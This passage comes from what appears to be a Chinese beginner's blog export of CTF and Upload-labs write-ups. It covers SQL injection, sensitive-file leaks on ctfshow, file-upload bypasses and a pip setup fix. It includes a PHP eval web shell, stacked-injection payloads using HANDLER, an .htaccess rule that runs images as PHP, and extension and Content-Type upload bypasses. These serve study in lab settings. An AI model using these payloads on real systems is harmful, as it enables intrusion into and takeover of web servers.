src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815036.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-13"><a href="#二、本题知识点-13" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p><strong>联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><h3 id="一、本题做题思路-24"><a href="#一、本题做题思路-24" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>当我们直接上传.php文件时，会出现错误回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以跟往常题一样，通过图片绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现其对文件内容也有要求 </p><p>所以换种php输入方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">想着再通过.htaccess文件使蚁剑可以连接，发现对其也有限制</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过没事，这个原因可以通过BP抓包，然后将Content-Type 修改为image&#x2F;jpg就行</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817469.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">蚁剑连接在主目录得到答案</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><h2 id="一、本题做题思路-25"><a href="#一、本题做题思路-25" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818019.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">跟随便注那道题很像，所以我们先看看过滤了啥</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818016.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 只能尝试堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818976.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题为’闭合</p><p>所以尝试堆叠注入查查库</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show tables-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818022.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到线索了，直接查看Flaghere这个表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;FlagHere&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 再看看words表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;words&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818457.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到这里尝试抓取flag也没法实现，也没法像随便注那道题那样解决，看网上大佬博客知道了还有<strong>Handler</strong>方法 </p><p><strong>HANDLER … OPEN语句打开一个表<br> HANDLER … READ语句访问<br> HANDLER … CLOSE关闭一个表</strong></p><p>由此我们可以构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">  </p><h3 id="二、本题知识点-14"><a href="#二、本题知识点-14" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>MySQL 中除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。</strong></p><p>**<code>HANDLER ... OPEN</code><strong>语句会打开一个表，使其能够用后续的</strong><code>HANDLER ... READ</code><strong>语句访问。这个表不能和其他会话共享直到</strong><code>HANDLER ... CLOSE</code>**或会话关闭。</p><p>详情可看<a href="https://www.jianshu.com/p/81fad5351736">大佬博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网安、新手、WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow限免vip题目WP</title>
      <link href="/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/"/>
      <url>/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/</url>
      
        <content type="html"><![CDATA[<p> 学习web时刷题，其题目确实很基础适合我这种新手入手</p><h2 id="一、源码泄露"><a href="#一、源码泄露" class="headerlink" title="一、源码泄露"></a>一、源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819256.png"></p><p>本题就是简单的查看源代码找到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819910.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="二、前台JS绕过"><a href="#二、前台JS绕过" class="headerlink" title="二、前台JS绕过"></a>二、前台JS绕过</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820126.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 本题打开后显示无法打开源代码，但好像只要手动打开源代码就能看到flag，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820840.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>或者将本题用BP抓包就可以拿到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211821021.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="三、协议头信息泄露"><a href="#三、协议头信息泄露" class="headerlink" title="三、协议头信息泄露"></a>三、协议头信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211824129.png"></p><p>打开本题也是问flag在哪里，本题要么直接BP抓包然后在重发器发送后头中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211825332.png"></p><p>或者在浏览器的网络里找到Date，下面有着flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826033.png"></p><h2 id="四、robots后台泄露"><a href="#四、robots后台泄露" class="headerlink" title="四、robots后台泄露"></a>四、robots后台泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826548.png"></p><p>如图本题还是一样的要求，根据题目我们可以知道其跟robots有关，所以在本题网址后输入&#x2F;robots.txt，可以得到如下图的情况：<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827220.png"></p><p>再将robots.txt替换成如图的txt,得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827270.png"></p><h2 id="五、phps源码泄露"><a href="#五、phps源码泄露" class="headerlink" title="五、phps源码泄露"></a>五、phps源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827658.png"></p><p>根据本题题目phps源码泄露，想到了index.phps可能与其相关，输入后得到一个phps文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827676.png"> 打开文件后得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828741.png"></p><h2 id="六、源码压缩包泄露"><a href="#六、源码压缩包泄露" class="headerlink" title="六、源码压缩包泄露"></a>六、源码压缩包泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828880.png"></p><p>本题依旧是需要借题目来得到关于flag的线索</p><p>根据上关源码泄露，以及本题源码压缩包泄露 ,直接访问&#x2F;<a href="http://www.zip.一般网站的文件都在www下,所以直接访问www.zip可以得到所需压缩包,打开后里面有俩个文件/">www.zip。一般网站的文件都在www下，所以直接访问www.zip可以得到所需压缩包，打开后里面有俩个文件</a><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828879.png"></p><p>多半与第一个txt文件有关，直接在网站搜索该文件，即在网站后缀加上&#x2F;fl000g.txt。得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828829.png"></p><h2 id="七、版本控制泄露源码"><a href="#七、版本控制泄露源码" class="headerlink" title="七、版本控制泄露源码"></a>七、版本控制泄露源码</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211829737.png">依旧是要依靠题目来得到我们所需的flag，本题题目所设计版本控制，上网搜了下版本控制系统，</p><!--版本控制系统（Version Control System，VCS）是一种软件，可以帮助软件团队的开发人员协同工作，并存档他们工作的完整历史记录-->。 <p> 一般常用的有Git，VSS，SVN等版本，本题所用的便是Git，在网址后面加上&#x2F;.git就能得到flag了</p><h2 id="八、版本控制泄露源码2"><a href="#八、版本控制泄露源码2" class="headerlink" title="八、版本控制泄露源码2"></a>八、版本控制泄露源码2</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830207.png"></p><p> 根据上题所知，尝试得到本题的版本控制系统是SVN,所以在网站后面加上&#x2F;.svn就可以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830193.png"></p><h2 id="九、vim临时文件泄露"><a href="#九、vim临时文件泄露" class="headerlink" title="九、vim临时文件泄露"></a>九、vim临时文件泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831001.png"></p><p>从题目找线索，从而来去得到flag 。当vim文件不正常退出时会生成一个.swp临时文件，从而造成文件信息泄露，一般网站编辑文件都是index.php。所以在文件后面加上&#x2F;index.php.swp得到一个swp文件，打开得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831994.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831991.png"></p><h2 id="十、cookie泄露"><a href="#十、cookie泄露" class="headerlink" title="十、cookie泄露"></a>十、cookie泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831170.png"></p><p>有题目可以得知本题是跟cookie相关的.。要么简单粗暴用BP抓包，直接可以在cookie上看到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831219.png"></p><p><strong>将%7B%7D编码后就是{}</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832008.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832001.png"> 或者就是打开浏览器找到cookie同样可以拿到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832059.png"></p><h2 id="十一-、域名txt记录泄露"><a href="#十一-、域名txt记录泄露" class="headerlink" title="十一 、域名txt记录泄露"></a>十一 、域名txt记录泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832670.png"></p><p>找到一个在线域名解析记录检测，可以在TXT中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832660.png"></p><h2 id="十二、敏感信息公布"><a href="#十二、敏感信息公布" class="headerlink" title="十二、敏感信息公布"></a>十二、敏感信息公布</h2><p>打开网站是一个购物平台</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833094.png">不知道从哪下手，然后御剑扫出一个网站+<strong>&#x2F;admin</strong>，后来发现用**&#x2F;robots.txt<strong>也能得到这个网站+</strong>&#x2F;admin**，如图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833426.png"></p><p>打开后发现是个登录系统</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833430.png"></p><p>猜测用户名是admin，密码考虑题目敏感信息公布，猜测可能就在那个网站里，当移到最下面时发现有一串数字，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833951.png"></p><p>重新回到登录系统，尝试后登录成功拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833961.png"></p><h2 id="十三、内部技术文档泄露"><a href="#十三、内部技术文档泄露" class="headerlink" title="十三、内部技术文档泄露"></a>十三、内部技术文档泄露</h2><p>本题打开后也是如十二题一样是个网站，尝试像十二题那样查询robots.txt无果，只能从这网站找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834788.png"></p><p>原本一筹莫展，当翻到网址最下面，发现其”document”可以点击,从中找到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834603.png"></p><p>document移到最下面的内容为下图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834526.png"></p><p>将原本的网站加上&#x2F;system1103&#x2F;login.php进入登录界面，输入默认用户名和密码得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834501.png"></p><h2 id="十四、编辑器配置不当"><a href="#十四、编辑器配置不当" class="headerlink" title="十四、编辑器配置不当"></a>十四、编辑器配置不当</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834819.png"></p><p>打开后是跟十一、十二关那样是一个页面，但根据题目内的提示，在网站后缀加上&#x2F;editor进入一个新的页面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834763.png"></p><p>找到上传文件的地方，进入文件空间，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835034.png"></p><p>打开文件空间，依次点击**&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere**,从而发现藏在其中的txt文件，</p><p>然后通过在主网址上加上**&#x2F;nothinghere&#x2F;fl000g.txt**找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835023.png"></p><h2 id="十五、密码逻辑脆弱"><a href="#十五、密码逻辑脆弱" class="headerlink" title="十五、密码逻辑脆弱"></a>十五、密码逻辑脆弱</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835198.png"></p><p>仍然是网页，放进御剑里扫一扫，扫出一个admin</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835060.png"></p><p>进入一看是登录页面，猜测用户名应该是admin，但是密码未知</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835055.png"></p><p>发现有个忘记密码的按钮，点进去后需要回答密保问题才能得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835064.png"></p><blockquote><p>再结合本题所给的提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p> 返回主网站，找到邮箱，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836434.png"></p><p>然后登录自己qq查询该账号，发现其人在西安，返回回答问题，得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836432.png"> 然后输入用户名和密码得到flag</p><h2 id="十六、探针泄露"><a href="#十六、探针泄露" class="headerlink" title=" 十六、探针泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836206.png"> 十六、探针泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836281.png"> 打开页面就是一个元素周期表，没有任何线索，但是根据题目所给提示，考虑与探针相关</p><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p> 所以在网站后面加上**&#x2F;tz.php**</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837626.png"></p><p>点击后可以从里面找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837606.png"></p><h2 id="十七、CDN穿透"><a href="#十七、CDN穿透" class="headerlink" title="十七、CDN穿透"></a>十七、CDN穿透</h2><p>这题应该是坏了，直接提示把答案发出来了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837837.png"> 如果查这个网站的IP地址提交上去的是错误的。</p><h2 id="十八、js敏感信息泄露"><a href="#十八、js敏感信息泄露" class="headerlink" title="十八、js敏感信息泄露"></a>十八、js敏感信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837089.png"></p><p>本题打开后发现是一个小游戏，一般网站小游戏考虑达到一定的分数给出flag，所以查询源代码来看看是否有满足分数条件给flag的代码。发现当分数大于100时会给出一串十六进制编码。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837045.png"> 将这十六进制编码进行ascii转换，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838810.png"> 所以在主网站的后面加上&#x2F;110.php。得到flag</p><h2 id="十九、前端密钥泄露"><a href="#十九、前端密钥泄露" class="headerlink" title=" 十九、前端密钥泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838224.png"> 十九、前端密钥泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838181.png"> 打开后是一个登录页面，查看源代码可以发现一个post<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838188.png"> 然后在火狐浏览器或者BP中POST传参，得到flag</p><h2 id="二十、数据库恶意下载"><a href="#二十、数据库恶意下载" class="headerlink" title=" 二十、数据库恶意下载"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838323.png"> 二十、数据库恶意下载</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838285.png"> 根据题目提示</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 </p></blockquote><p>所以在网站后面加入&#x2F;db&#x2F;db.mdb得到一个下载的文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839148.png"></p><p>用notepad++打开查找”flag”找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839136.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>重写一遍还是受益良多的</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、网安、新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场(01-06)</title>
      <link href="/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/"/>
      <url>/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/</url>
      
        <content type="html"><![CDATA[<p>本博客只是自己当时做题的想法，并未涉及太深，要更深层次了解，还是需要去看看其他大佬的做题思路。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>首先会发现，如果直接上传php，会提示不让直接上传该图片<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211019442.png"><br>但是上传图片可以上传，所以放入BP中看看<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020395.png"><br>将1.png修改为1.php再发送，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020908.png"><br>再通过靶场查询这个php，上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020662.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="1、修改上传类型"><a href="#1、修改上传类型" class="headerlink" title="1、修改上传类型"></a>1、修改上传类型</h3><p>首先根据源代码可以看到，这是需要确认文件类型<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>所以可以通过用BP去抓个php文件的包，然后将如下图标注的地方进行修改，可以将Content-Type修改为允许上传的类型image&#x2F;jpeg或image&#x2F;png或image&#x2F;gif。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020904.png"><br>修改后发送发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020641.png"><br>访问验证一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020386.png"></p><h3 id="2、如Pass-1的做法"><a href="#2、如Pass-1的做法" class="headerlink" title="2、如Pass 1的做法"></a>2、如Pass 1的做法</h3><p>先上传图片，然后文件类型就已经变成图片的类型，然后再将图片后缀修改为php，发送。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020938.png"><br><img src="https://img-blog.csdnimg.cn/21c302db6b424a1b8884cd4aa1ea8231.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>首先查看这道题的源代码，发现是黑名单验证<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020723.png"><br>且不允许上传.php后缀文件，我这里是将php后缀修改成php5后上传。发现成功上传<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020292.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>详情可以看这位大佬的黑名单绕过，里面不局限于php5后缀，还是有很多修改可以上传。<br><a href="https://blog.csdn.net/qq_25899635/article/details/90344198">大佬博客</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>先查看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020418.png"><br>发现很多后缀被禁止上传。所以需要用到.htaccess配置文件，并且在其<br>文件内部写上<br>    &lt;FileMatch”4.png”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>可以将其中4.png解析为php，在其中写入php代码就行，<br>然后通过BP抓图片包，将其在重发器中发送一下，发现上传成功，访问4.png就行了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021541.png"><br>访问一下，因为我这个浏览器访问会黑屏，所以看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021757.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>从源代码来看和上题一样导致很多文件无法上传，且上题使用的.htaccess文件也被限制了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021860.png"><br>但其中php7文件后缀还可以使用绕过，利用BP抓包并将后缀改为php7，发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021342.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021667.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>这道题可以通过php大小写绕过，先用BP抓住一个php后缀文件的包，然后在重发器将其后缀修改为PHP，发现上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021340.png"><br>访问一下验证。（不知道为什么打到6的适时候浏览网站就无法看到，显示内部浏览器错误，所以这是找的一个大佬的做的结果），其最后结果就是访问后类似这个就说明上传成功了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021871.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这个时候发现很多自己不会的知识，也从中学习到了很多，希望能慢慢学习，不断进步。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决pythoncharm中关于Crypto的相关问题</title>
      <link href="/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p> 在学习一道rsa题wp中，发现其代码无法在我的PythonCharm中运行并发出报错，报错内容如下：</p><blockquote><p>from Crypto.Util.number import *<br>ImportError: No module named Crypto.Util.number </p></blockquote><p>上网搜索原因是我的pythoncharm中并没有crypto的下载，需要通过pip对其进行下载。于此同时，发现我的pip也无法使用（晕），当我使用pip时给我发出如下的报错：</p><blockquote></blockquote><p>pip : 无法将“pip”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确， 然后再试一次。 所在位置 行:1 字符: 1 + pip ins</p><p>于是我又上网查询一下解决出现这种问题的方法。解决方式如下：<br>一般来说，让我们下载PythonCharm时，pip也已经下载好了，可以通过打开PythonCharm左上角的 文件&#x2F;设置&#x2F;项目&#x2F;Python解释器 找到它。如图：<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021780.png"><br>但是如果直接在PythonCharm的终端里面打出:<br>     <code>pip install crypto</code></p><p>就会出现上面我所说的报错， 就是虽然下载了pip，但并未在PythonCharm中配置pip环境，所以无法使用，所以我们需要对pip进行环境配置，第一步是直接在PythonCharm内部进行pip的环境配置，有的人在第一步后就可以使用pip了，但是有的还是会出现pip的报错(比如我)，所以我们还需要对系统进行环境配置，下面是第一步的步骤：</p><p>首先还是打开PythonCharm，找到左上角的  文件&#x2F;设置&#x2F;项目  找到如图所在的位置，并点击红圈标记的地方<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021253.png"><br>然后进入环境变量界面，点击 “ + ” <br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021497.png"><br>名称：Path  值：复制下图中的位置部分<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021820.png"><br>应用后重启PythonCharm，然后打开PythonCharm中的终端输入pip，看是否出现如下图的情况<br><img 